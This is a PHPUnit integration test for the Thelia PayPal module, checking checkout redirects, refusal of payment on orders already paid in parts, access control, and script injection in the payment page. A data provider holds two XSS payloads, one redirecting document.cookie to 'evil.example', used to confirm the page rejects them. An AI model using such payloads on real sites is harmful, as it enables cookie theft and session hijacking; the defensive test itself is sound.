<?php

declare(strict_types=1);

/*
 * This file is part of the Thelia package.
 * http://www.thelia.net
 *
 * (c) OpenStudio <info@thelia.net>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace PayPal\Tests;

// The tests are found by their path, not by an autoload: the shared fixtures are loaded the same way.
require_once __DIR__.'/PaymentPartsFixtures.php';

use PHPUnit\Framework\Attributes\DataProvider;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\HttpKernelInterface;
use Symfony\Component\Process\Process;
use Thelia\Core\HttpFoundation\Session\Session;
use Thelia\Model\Customer;
use Thelia\Model\ModuleQuery;
use Thelia\Model\OrderQuery;
use Thelia\Model\OrderStatus;
use Thelia\Test\IntegrationTestCase;

/**
 * The buyer who leaves PayPal without paying reaches the failure page of the theme, which cancels the order of the
 * session; the payment page of a Twig theme renders, its buttons sending the buyer back on the Thelia 3 checkout
 * routes.
 *
 * Run from the root of the Thelia project the module is installed in, against a disposable database (see bootstrap.php).
 */
final class CheckoutReturnsTest extends IntegrationTestCase
{
    use PaymentPartsFixtures;

    /**
     * PayPal ships inactive (enabled-by-default 0) and an inactive module declares no route: when the container of
     * the test kernel has no PayPal route, activate the module in the test database and rebuild that container,
     * whatever bootstrap runs the suite. The console runs with the database and debug mode of the test kernel, so
     * that neither the activation nor the rebuilt container reach another database set in the shell.
     */
    public static function setUpBeforeClass(): void
    {
        self::bootKernel();
        $kernel = self::$kernel;
        $container = static::getContainer();
        $routesLoaded = null !== $container->get('router')->getRouteCollection()->get('paypal_front_pay');
        $environment = [];
        foreach (['host', 'port', 'name', 'user', 'password'] as $setting) {
            $environment['DATABASE_'.strtoupper($setting)] = (string) $container->getParameter('thelia.database_'.$setting);
        }
        self::ensureKernelShutdown();

        if ($routesLoaded) {
            return;
        }

        $console = [\PHP_BINARY, $kernel->getProjectDir().'/bin/console'];
        $options = ['--env='.$kernel->getEnvironment(), ...($kernel->isDebug() ? [] : ['--no-debug'])];

        $activation = new Process([...$console, 'module:activate', 'PayPal', ...$options], $kernel->getProjectDir(), $environment);
        $activation->run();

        if (!$activation->isSuccessful() && !str_contains($activation->getOutput(), 'already activated')) {
            throw new \RuntimeException("Could not activate PayPal in the test database:\n".$activation->getOutput().$activation->getErrorOutput());
        }

        (new Process([...$console, 'cache:clear', ...$options], $kernel->getProjectDir(), $environment))->setTimeout(null)->mustRun();

        ModuleQuery::resetActivated();
    }

    public function testLeavingPayPalReachesTheFailurePageWithTheOrderStillToCancel(): void
    {
        $customer = $this->createFixtureFactory()->customer($this->createFixtureFactory()->customerTitle());
        $order = $this->createFixtureFactory()->order($customer, ['statusCode' => OrderStatus::CODE_NOT_PAID, 'paymentModuleCode' => 'PayPal']);

        $response = $this->request('/module/paypal/cancel/'.$order->getId(), $customer);

        self::assertSame(Response::HTTP_FOUND, $response->getStatusCode());
        self::assertStringContainsString('/checkout/failed?order_id='.$order->getId(), (string) $response->headers->get('Location'));
        self::assertTrue(OrderQuery::create()->findPk($order->getId())?->isNotPaid(), 'the failure page cancels it, for an order of the session still waiting for its payment');
    }

    public function testThePaymentPageSendsTheBuyerBackOnTheCheckoutRoutes(): void
    {
        $customer = $this->createFixtureFactory()->customer($this->createFixtureFactory()->customerTitle());
        $order = $this->createFixtureFactory()->order($customer, ['statusCode' => OrderStatus::CODE_NOT_PAID, 'paymentModuleCode' => 'PayPal']);

        $response = $this->request('/order/paypal/pay?order_id='.$order->getId(), $customer);
        $html = (string) $response->getContent();

        self::assertSame(Response::HTTP_OK, $response->getStatusCode(), substr(strip_tags($html), 0, 500));
        self::assertStringContainsString("window.location.href = '/checkout/confirm'", $html);
        self::assertStringContainsString("window.location.href = '/checkout/failed?order_id=".$order->getId()."'", $html);
        self::assertStringContainsString("window.location.href = '/module/paypal/cancel/".$order->getId()."'", $html);
        self::assertStringNotContainsString('/order/placed/', $html);
        self::assertStringNotContainsString('/order-failed', $html);
    }

    public function testARecurringPaymentIsRefusedForAnOrderPaidInParts(): void
    {
        $fixtures = $this->createFixtureFactory();
        $customer = $fixtures->customer($fixtures->customerTitle());
        $order = $this->orderOf100($customer);
        $this->payInParts($order, '30.000000', '70.000000');

        $response = $this->postJson('/paypal/api/pay', ['order_id' => $order->getId(), 'planified_payment_id' => 1], $customer);

        self::assertSame(Response::HTTP_CONFLICT, $response->getStatusCode());
        self::assertStringContainsString('recurring payment', (string) $response->getContent());
    }

    public function testNothingIsSentToPayPalWhenThePartsLeaveNothingToPay(): void
    {
        $fixtures = $this->createFixtureFactory();
        $customer = $fixtures->customer($fixtures->customerTitle());
        $order = $this->orderOf100($customer);
        $this->payInParts($order, '100.000000', '0.000000');

        $response = $this->postJson('/paypal/api/pay', ['order_id' => $order->getId(), 'return_url' => '/checkout/confirm', 'cancel_url' => '/checkout/failed'], $customer);

        self::assertSame(Response::HTTP_CONFLICT, $response->getStatusCode());
        self::assertStringContainsString('Nothing left to pay', (string) $response->getContent());
    }

    /** @return iterable<string, array{string, string}> */
    public static function scriptInjections(): iterable
    {
        yield 'script without a slash' => [';alert(document.cookie)', 'alert(document.cookie)'];
        yield 'script with a redirection' => [';location=`//evil.example/`+document.cookie//', 'evil.example'];
    }

    #[DataProvider('scriptInjections')]
    public function testThePaymentPageNeverWritesAnythingButAnOrderIdInItsScript(string $suffix, string $injected): void
    {
        $customer = $this->createFixtureFactory()->customer($this->createFixtureFactory()->customerTitle());
        $order = $this->createFixtureFactory()->order($customer, ['statusCode' => OrderStatus::CODE_NOT_PAID, 'paymentModuleCode' => 'PayPal']);

        $response = $this->request('/order/paypal/pay?order_id='.rawurlencode($order->getId().$suffix), $customer);

        self::assertStringNotContainsString($injected, (string) $response->getContent());
        self::assertSame(Response::HTTP_BAD_REQUEST, $response->getStatusCode());
    }

    public function testThePaymentPageOfAnotherCustomersOrderIsNotFound(): void
    {
        $fixtures = $this->createFixtureFactory();
        $order = $fixtures->order($fixtures->customer($fixtures->customerTitle()), ['statusCode' => OrderStatus::CODE_NOT_PAID, 'paymentModuleCode' => 'PayPal']);

        $response = $this->request('/order/paypal/pay?order_id='.$order->getId(), $fixtures->customer($fixtures->customerTitle()));

        self::assertSame(Response::HTTP_NOT_FOUND, $response->getStatusCode());
    }

    public function testThePaymentPageIsNotFoundToNobodySignedIn(): void
    {
        $fixtures = $this->createFixtureFactory();
        $order = $fixtures->order($fixtures->customer($fixtures->customerTitle()), ['statusCode' => OrderStatus::CODE_NOT_PAID, 'paymentModuleCode' => 'PayPal']);

        $response = $this->request('/order/paypal/pay?order_id='.$order->getId(), null);

        self::assertSame(Response::HTTP_NOT_FOUND, $response->getStatusCode());
    }

    private function request(string $uri, ?Customer $customer): Response
    {
        return $this->handle(Request::create($uri), $customer);
    }

    /**
     * @param array<string, mixed> $body
     */
    private function postJson(string $uri, array $body, ?Customer $customer): Response
    {
        return $this->handle(Request::create($uri, 'POST', [], [], [], ['CONTENT_TYPE' => 'application/json'], json_encode($body, \JSON_THROW_ON_ERROR)), $customer);
    }

    private function handle(Request $request, ?Customer $customer): Response
    {
        $session = static::getContainer()->get('request_stack')->getCurrentRequest()?->getSession();
        self::assertInstanceOf(Session::class, $session);
        null === $customer ? $session->clearCustomerUser() : $session->setCustomerUser($customer);
        $request->setSession($session);

        return static::$kernel->handle($request, HttpKernelInterface::SUB_REQUEST);
    }
}
